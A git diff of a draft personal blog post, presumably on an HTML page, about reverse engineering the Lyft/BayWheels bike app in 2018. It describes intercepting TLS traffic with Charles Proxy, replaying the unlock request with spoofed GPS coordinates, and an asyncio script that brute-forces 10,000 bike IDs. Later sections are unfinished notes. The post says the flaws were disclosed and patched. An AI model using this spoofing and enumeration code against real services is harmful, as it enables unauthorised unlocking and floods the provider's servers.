@@ -1,14 +1,16 @@
 <!DOCTYPE html>
+<!-- Auto-generated from blog-md/lyft-bikes.md by build.sh -->
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Reverse engineering Lyft bikes for fun (and profit) - Ilan Bigio</title>
-  <link id="favicon" rel="icon" href="/images/sunflower-dynamic.svg" type="image/svg+xml">
+  <title>Reverse engineering Lyft bikes for fun (and
+profit) - Ilan Bigio</title>
+  <link id="favicon" rel="icon" href="/images/tree.svg" type="image/svg+xml">
   <link rel="stylesheet" href="/style.css">
   <link rel="stylesheet" href="/vendor/atom-one-light.min.css" media="(prefers-color-scheme: light)">
   <link rel="stylesheet" href="/vendor/atom-one-dark.min.css" media="(prefers-color-scheme: dark)">
-  <script defer src="/js/sunflower-dynamic.js"></script>
+  <script defer src="/js/illustration-dynamic.js"></script>
   <script src="/vendor/highlight.min.js"></script>
   <script>document.addEventListener('DOMContentLoaded', () => hljs.highlightAll());</script>
 </head>
@@ -16,113 +18,318 @@
   <article>
     <header>
       <div class="article-header-row">
-        <a href="/index.html" class="back">← Back</a>
-        <a href="/index.html" class="home-icon" aria-label="Home">
-          <img src="/images/sunflower-outline.svg" alt="">
+        <a href="/" class="back">← Back</a>
+        <a href="/" class="home-icon" aria-label="Home">
+          <picture>
+            <source srcset="/images/tree-outline-white.svg" media="(prefers-color-scheme: dark)">
+            <img src="/images/tree-outline-black.svg" alt="">
+          </picture>
         </a>
       </div>
       <h1>Reverse engineering Lyft bikes for fun (and profit)</h1>
-      <time datetime="2026-01-15">January 2026</time>
+      <time datetime="January 2026">January 2026</time>
     </header>
 
-    <p>This is the <strong>opening paragraph</strong> with some <em>italic text</em> and a <a href="https://example.com">link to somewhere</a><sup id="fnref-1"><a class="footnote-ref" href="#fn-1" aria-label="Footnote 1">1</a></sup>. It sets the stage for what's to come.</p>
+<p>One cold San Francisco summer morning in Haight-Ashbury, my commute
+down to Market was interrupted by the sight of a lucky duck taking the
+last Lyft bike – again.</p>
+<p>"I should really just wake up 15 minutes earlier", I thought,
+fleetingly. Then instead proceeded to spend the next month learning</p>
+<ul>
+<li>how to reverse engineer the Lyft Bikes private endpoints,</li>
+<li>tinkering with wifi proxies and custom SSL certificates to bypass
+encryption,</li>
+<li>chasing loose bikes across the city,</li>
+<li>causing an incident at Lyft,</li>
+<li>getting flagged,</li>
+<li>and somehow making a profit.</li>
+</ul>
+<p>I learned a ton, so I'm sharing the journey in case you may too.</p>
+<p><a
+href="https://www.notion.so/Reverse-engineering-lyft-bikes-for-fun-and-profit-2db9f6a8122080049bd3e61b3238f00e?pvs=21">Skip
+to technical summary →</a></p>
+<blockquote>
+<p><strong>Disclaimer:</strong> This writeup is meant for education
+purposes only. Any vulnerabilities were disclosed and patched in
+2018.</p>
+</blockquote>
+<h2 id="table-of-contents">Table Of Contents</h2>
+<h2 id="the-acquisition">The Acquisition</h2>
+<p>Back in 2018 Lyft Bikes (BayWheels) used to be <a
+href="https://automotive.lulop.com/en_EN/post/show/131501/ford-gobike-launching-in-bay-a.html">Ford
+GoBikes</a>, and used to be unlocked on a per-station basis. You'd
+generate a temporary code for a specific station on your app, then punch
+it into that station which would release a random bike.</p>
+<img src="/images/blog/lyft-bikes/ford-gobikes.webp" alt="Ford GoBikes" style="border-radius: 4px">
 
-    <h2>The Discovery</h2>
+<p>My goal was to make sure nobody could take a bike while I was
+on-route to the station, so what if I just kept manually generating
+codes until I arrived? Maybe that might block others from doing so. So I
+tried it. No luck. Generating a code didn't block others, and that was
+the only way to unlock bikes. Welp, nothing left to try...</p>
+<p>...until the next day, when <a
+href="https://www.lyft.com/blog/posts/lyft-to-acquire-us-bikeshare-leader">Lyft
+acquired Ford GoBikes</a> and the whole unlock mechanism changed. All
+hail Lyft.</p>
+<p>The new Lyft map also showed bikes at stations, but now you'd unlock
+a bike directly by scanning a QR code on it. Each bike also had 4-digit
+number you could use in case scanning didn't work. Maybe if I typed a
+bike's code into my app when I left, it would be unlocked (and hopefully
+still there) by the time I arrived? So I tried it.</p>
+<p><code>You are too far from this station.</code></p>
+<p>They had geofenced it. I spent a solid day Googling how to spoof GPS
+on iPhone but no luck. "I wonder what the app is actually sending to
+Lyft during an unlock." And so my journey of snooping encrypted iOS
+traffic began.</p>
+<h2 id="intercepting-ios-app-requests">Intercepting iOS App
+Requests</h2>
+<p>If you've used <a
+href="https://developer.chrome.com/docs/devtools">Chrome DevTools</a>
+(aka <code>Inspect Element</code>) you may have noticed a
+<code>Network</code> tab that lets you see the traffic between a website
+and its backend. Unfortunately it's not so simple for iOS. Some helpful
+Reddit posts led me to <a href="https://www.charlesproxy.com/">Charles
+Proxy</a> which lets you see <em>all</em> traffic from your computer,
+and a friendly <a
+href="https://www.charlesproxy.com/documentation/faqs/using-charles-from-an-iphone/">eight
+sentences</a> explained how to wire it up to my phone's traffic. It's
+basically a consensual <a
+href="https://www.notion.so/Reverse-engineering-lyft-bikes-for-fun-and-profit-2db9f6a8122080049bd3e61b3238f00e?pvs=21">man-in-the-middle
+attack</a>.</p>
+<p>First I had to forward my phone's traffic to Charles on my laptop. To
+do this I enabled "HTTP Proxy" on my phone's wifi settings, and set the
+the <code>[ip]:[port]</code> to <code>192.168.0.7:8888</code>:</p>
+<ul>
+<li><code>192.168.0.7</code> is my laptop's local IP which I got by
+running <code>ipconfig getifaddr en0</code></li>
+<li><code>8888</code> is the port Charles Proxy is running on</li>
+</ul>
+<p><img
+src="/images/blog/lyft-bikes/Screenshot_2026-01-01_at_2.18.19_PM.png"
+alt="Screenshot 2026-01-01 at 2.18.19 PM.png" /></p>
+<p>Now my traffic was being forwarded to Charles Proxy and huzzah! I
+could see all requests coming out of my phone. But... I can't see the
+content? Oh, right. SSL encryption. The thing making sure we can trust
+the internet was getting in my way.</p>
+<h2 id="spoofing-ssl-root-certificate-authorities">Spoofing SSL Root
+Certificate Authorities</h2>
+<p>SSL ensures traffic from the Lyft app is encrypted using the
+<code>lyft.com</code> public key, so only <code>lyft.com</code> can
+decrypt it <a
+href="https://www.notion.so/ilanbigio/Simplification.">^1</a>. All
+modern applications &amp; websites do this, and you can find the public
+key on a website's <a
+href="https://www.notion.so/Reverse-engineering-lyft-bikes-for-fun-and-profit-2db9f6a8122080049bd3e61b3238f00e?pvs=21">SSL
+certificate</a>.</p>
+<picture>
+  <source srcset="/images/blog/lyft-bikes/Screenshot_2026-01-01_at_2.12.36_PM.png" media="(prefers-color-scheme: dark)">
+  <img src="/images/blog/lyft-bikes/Screenshot_2026-01-01_at_2.12.36_PM.png" alt="SSL Certificate" width="50%">
+</picture>
 
-    <p>I was curious about how Lyft's bike-sharing system worked under the hood. What started as idle curiosity turned into a deep dive into their API<sup id="fnref-2"><a class="footnote-ref" href="#fn-2" aria-label="Footnote 2">2</a></sup>.</p>
+<p>In theory, this means my traffic is perfectly un-snoopable, even by
+me. However, Charles has a workaround: by enabling
+<code>SSL Proxying</code>, Charles will prevent the real
+<code>lyft.com</code> SLL certificate from making it back to your phone,
+and instead sends a new one it generates on the fly.</p>
+<p><img
+src="/images/blog/lyft-bikes/Screenshot_2026-01-01_at_2.09.23_PM.png"
+alt="Screenshot 2026-01-01 at 2.09.23 PM.png" /></p>
+<p>This means your phone is now encrypting <code>lyft.com</code> traffic
+with Charles's public key, so Charles can decrypt it, save it, then
+re-encrypt with the <em>real</em> <code>lyft.com</code> cert and forward
+it along.</p>
+<p><img
+src="/images/blog/lyft-bikes/Screenshot_2026-01-01_at_2.09.30_PM.png"
+alt="Screenshot 2026-01-01 at 2.09.30 PM.png" /></p>
+<p>But there's a catch – your phone will reject a certificate unless
+it's been signed by a Certificate Authority, endorsing it actually
+belongs to <code>lyft.com</code>. These CAs are third-party
+organizations acting like notaries that issue "root certificates", and
+your phone comes with many trusted CA root certificates pre-installed.
+So Charles just asks you to install one more root certificate – the
+Charles Root Certificate, used to sign all the other certificates
+Charles creates. And just like that, my phone trusts Charles, and I can
+see SSL traffic.</p>
+<h2 id="anatomy-of-a-lyft-request">Anatomy of a Lyft Request</h2>
+<p>So, let's unlock a bike shall we?</p>
+<p><code>Vehicle not found.</code></p>
+<p>Right. Well, I used <code>12345</code> as the bike ID, so that's
+expected. Charles managed to capture some traffic anyway. Let's see if
+we can find the unlock request.</p>
+<p><img src="/images/blog/lyft-bikes/api-routes.png"
+alt="api-routes.png" /></p>
+<p>So many requests and API routes! I see one endpoint called
+<code>rent</code>, which I bet is the unlock request. Let’s look at the
+contents.</p>
+<pre class="json"><code>POST &quot;https://layer.bicyclesharing.net/mobile/v2/fgb/rent&quot;
 
-    <p>Here's what I found when I started poking around:</p>
+HEADERS
+{
+  &quot;api-key&quot;: &quot;API_KEY_123&quot;,
+  &quot;authorization&quot;: &quot;API_TOKEN_123&quot;,
+  ...
+}
 
-    <ul>
-      <li>The bikes communicate over cellular networks</li>
-      <li>Each bike has a unique identifier</li>
-      <li>The API is surprisingly <em>well-documented</em> (internally)</li>
-    </ul>
-
-    <h2>Technical Deep Dive</h2>
-
-    <p>The first thing I did was inspect the network traffic. You can do this with a simple <code>curl</code> command<sup id="fnref-3"><a class="footnote-ref" href="#fn-3" aria-label="Footnote 3">3</a></sup>:</p>
-
-    <pre><code>curl -X GET "https://api.example.com/bikes" \
-  -H "Authorization: Bearer $TOKEN" \
-  -H "Content-Type: application/json"</code></pre>
-
-    <p>The response looked something like this:</p>
-
-    <pre><code>{
-  "bikes": [
-    {
-      "id": "bike_abc123",
-      "lat": 37.7749,
-      "lng": -122.4194,
-      "battery": 87,
-      "status": "available"
-    }
-  ],
-  "total": 1542
+DATA
+{
+  &quot;userLocation&quot;: { &quot;lat&quot;: 37.7714859, &quot;lon&quot;: -122.4449036 },
+  &quot;qrCode&quot;: { &quot;memberId&quot;: &quot;mem123&quot;, &quot;qrCode&quot;: &quot;12345&quot; },
+  ...
 }</code></pre>
+<p>Yup, looks like it is. Look at these fields (<em>I omitted the
+unrelated, redacted the sensitive.</em>) There's some auth in the
+headers (<code>api-key</code>, <code>authorization</code>), the dummy
+bike <code>qrCode</code> I used (<code>12345</code>), a
+<code>memberId</code> which I assume identifies my account, and...
+<code>userLocation</code> coordinates! Bingo. Now I just need to replay
+that request with a python script, but set the <code>lat</code>,
+<code>lon</code> to be right next to the station (whose coordinates I
+got using google maps).</p>
+<pre class="python"><code>import requests
 
-    <h3>Parsing the Data</h3>
+url=&quot;https://layer.bicyclesharing.net/mobile/v2/fgb/rent&quot;
 
-    <p>I wrote a simple Python script to parse this:</p>
+headers={
+  &quot;api-key&quot;: &quot;API_KEY_123&quot;,
+  &quot;authorization&quot;: &quot;API_TOKEN_123&quot;,
+}
 
-    <pre><code>import requests
-import json
+station_coords = { &quot;lat&quot;: 37.7730627, &quot;lon&quot;: -122.4390777 }    # from maps
+bike_id = &quot;12345&quot;                                              # dummy id
 
-def get_available_bikes(lat, lng, radius=500):
-    """Fetch all available bikes within a radius."""
-    response = requests.get(
-        f"https://api.example.com/bikes",
-        params={"lat": lat, "lng": lng, "radius": radius}
-    )
-    return response.json()["bikes"]
+data={
+  &quot;userLocation&quot;: station_coords,
+  &quot;qrCode&quot;: { &quot;memberId&quot;: &quot;mem123&quot;, &quot;qrCode&quot;:  bike_id},
+}
 
-# Find bikes near Dolores Park
-bikes = get_available_bikes(37.7596, -122.4269)
-print(f"Found {len(bikes)} bikes nearby")</code></pre>
+requests.post(url, headers=headers, json=data)</code></pre>
+<p>Sweet, now I just needed a real <code>bike_id</code> to test it on.
+It was very late at night <a href="#fn1" class="footnote-ref"
+id="fnref1" role="doc-noteref"><sup>1</sup></a> but I was excited, so
+out I went with my PJs, flip flops, and laptop to squat by my target
+bike. I found its ID, entered it into my script, hit run, and holy shit
+it worked. The bike unlocked. I re-locked it, ran back to my apartment,
+hit run again, ran back, and there she was. Unlocked, and
+inconspicuously so. Nobody would think to take it… but me.</p>
+<p>We’re in business.</p>
+<h2 id="i-promise-its-not-a-denial-of-service-attack">I Promise it’s not
+a Denial of Service Attack</h2>
+<p>Except… the bike IDs are only printed on the bikes. How would I know
+what <code>bike_id</code> to use without going to the station? Maybe
+some other request Charles captured might have all the bike IDs at a
+station? Short answer – no. Two days of digging through captured traffic
+yielded no way to fetch bike IDs. <a href="#fn2" class="footnote-ref"
+id="fnref2" role="doc-noteref"><sup>2</sup></a></p>
+<p>After considering many fruitless ideas, like hiding a little camera
+pointed at the bikes and using OCR, I thought… could I just try all IDs?
+Five digits, that’s 100,000 combinations… and thinking back, I had only
+seen IDs between <code>10000</code> and <code>20000</code>. 10,000 loop
+iterations is not <em>that</em> many for python!</p>
+<p>This runs in less than a second:</p>
+<pre class="python"><code>for i in range(10_000, 20_000):
+    print(i)</code></pre>
+<p>This, however, takes a second <em>per request</em>. So… ~three hours
+for 10,000 requests.</p>
+<pre class="python"><code>def payload(i):
+    return {
+        &quot;userLocation&quot;: station_coords,
+        &quot;qrCode&quot;: { &quot;memberId&quot;: &quot;mem123&quot;, &quot;qrCode&quot;:  i},
+    }
 
-    <h2>What I Learned</h2>
+def send_one(i):
+    requests.post(url, headers=headers, json=payload(i))
 
-    <ol>
-      <li>Always check for rate limiting</li>
-      <li>APIs often expose more than intended</li>
-      <li>Documentation is sometimes hidden in plain sight</li>
-    </ol>
+for i in range(10_000, 20_000):
+    send_one(i)</code></pre>
+<p>But we don’t have to wait for each request to come back – we can run
+them in parallel. After trying <code>multiprocessing</code> and
+<code>threading</code>, I massaged a stack overflow code snippet using
+<code>aiohttp</code> to start a bunch of requests without blocking on a
+response. Here’s a simplified version.<a href="#fn3"
+class="footnote-ref" id="fnref3" role="doc-noteref"><sup>3</sup></a></p>
+<pre class="python"><code>import asyncio, aiohttp
 
-    <blockquote>
-      <p>"The best way to understand a system is to try to break it." — Someone, probably</p>
-    </blockquote>
+async def send_one(session, i):                              # non-blocking
+  async with session.post(url, headers=headers, json=payload(i)): pass
 
-    <h3>A Note on Ethics</h3>
+async def main():
+  async with aiohttp.ClientSession() as s:
+    tasks = [send_one(s, i) for i in range(10_000, 20_000)]  # start all
+    await asyncio.gather(*tasks)                             # wait for all
 
-    <p>I want to be clear: I didn't do anything <strong>malicious</strong> with this information. The goal was purely educational. If you're doing similar research:</p>
+asyncio.run(main())</code></pre>
+<p>I benchmarked this against <a
+href="https://www.postman.com/">Postman’s API</a> (meant for testing)
+and it ran in 15 seconds! That’s 650 RPM. Hm… is that too much for their
+servers? In April of 2018 <a
+href="https://www.sfmta.com/media/14273/download?inline=">there were an
+average of 3,370 trips per weekday</a> So even if 80% of those all
+happened during rush hour (8-10am, 5-7pm) that’s still a whopping 11
+RPM. I’d be single-handedly 60x-ing their peak traffic.</p>
+<p>In practice, however, this hit a ton of limits and failures caused by
+going this hard. The solution was to cap at ~1000 connections, which
+brought execution to ~30 minutes</p>
+<p>But as days passed by, and I played with unlocking different bikes I
+noticed a pattern which slowly turned into a suspicion.
+<code>13576</code>. <code>17364</code>. <code>18921</code>.
+<code>13224</code>. <code>16618</code>… do you see it? All IDs seemed to
+sit roughly between <code>10000</code> and <code>20000</code>– that’s
+just 10,000! A whole order of magnitude less.</p>
+<p>So for days I checked every bike I passed. Wait, are these
+<em>all</em> between <code>10,000</code> and <code>20,000</code>?</p>
+<ul>
+<li>this is how tracked united healthcare murderer on lyft bikes</li>
+<li>putting camera on station?</li>
+<li>not that many ids...</li>
+<li>emails to companies</li>
+<li>fast async requests</li>
+<li>unlocked extra bike? huh</li>
+</ul>
+<h2 id="the-good-days">The Good Days</h2>
+<ul>
+<li>bike always there, would re-lock second unlocked bike</li>
+<li>unlocked e-bike, saw someone take it</li>
+<li>eleanor tells me</li>
+<li>panic</li>
+</ul>
+<h2 id="man-on-the-inside">Man on the Inside</h2>
+<ul>
+<li>hacker 1 disclosure -&gt; not even eligible?</li>
+<li>non-brute force guidelines</li>
+<li>roommate telling me about discussion at lyft about me</li>
+<li>bounty</li>
+<li>lyft intern party</li>
+</ul>
+<h1 id="technical-breakdown">Technical Breakdown</h1>
+<p>Breakdown</p>
+<h1 id="notes">Notes</h1>
+<ul>
+<li>make the -f+d in git diff formatting</li>
+</ul>
+<h1 id="dump">Dump</h1>
+<p>a sight I had been dreading: an empty Lyft Bike station. I had
+checked the app at 8:24am, there had been two bikes there. Yet when I
+arrived five minutes later, they were gone. Snagged before I arrived. <a
+href="https://www.notion.so/ilanbigio/Simplification.">^1</a></p>
+<section id="footnotes" class="footnotes footnotes-end-of-document"
+role="doc-endnotes">
+<hr />
+<ol>
+<li id="fn1"><p>10:30pm in San Francisco.<a href="#fnref1"
+class="footnote-back" role="doc-backlink">↩︎</a></p></li>
+<li id="fn2"><p>Except for eBikes, which were very few at this point,
+and which flash very conspicuously when unlocked as I found out after
+having to trek to re-lock one I accidentally unlocked across the city
+during testing.<a href="#fnref2" class="footnote-back"
+role="doc-backlink">↩︎</a></p></li>
+<li id="fn3"><p>semaphores<a href="#fnref3" class="footnote-back"
+role="doc-backlink">↩︎</a></p></li>
+</ol>
+</section>
 
-    <ul>
-      <li>Don't abuse rate limits</li>
-      <li>Don't access data you shouldn't</li>
-      <li>Report vulnerabilities responsibly</li>
-    </ul>
-
-    <hr>
-
-    <section class="footnotes" aria-label="Footnotes">
-      <ol>
-        <li id="fn-1">
-          This post uses placeholder links and sample endpoints for readability.
-          <a class="footnote-backref" href="#fnref-1" aria-label="Back to reference 1">↩</a>
-        </li>
-        <li id="fn-2">
-          Details that could identify real users, devices, or tokens are intentionally omitted.
-          <a class="footnote-backref" href="#fnref-2" aria-label="Back to reference 2">↩</a>
-        </li>
-        <li id="fn-3">
-          Always prefer read-only exploration (and respect terms, laws, and rate limits).
-          <a class="footnote-backref" href="#fnref-3" aria-label="Back to reference 3">↩</a>
-        </li>
-      </ol>
-    </section>
-
-    <p>If you found this interesting, you might also enjoy my post on <a href="#">building a Bayesian Liar's Dice AI</a>. Or follow me on <a href="https://twitter.com/ilanbigio">Twitter</a> where I post about this kind of stuff.</p>
+    <footer>
+      <a href="/blog-md/lyft-bikes.md">View source</a>
+    </footer>
   </article>
 </body>
 </html>
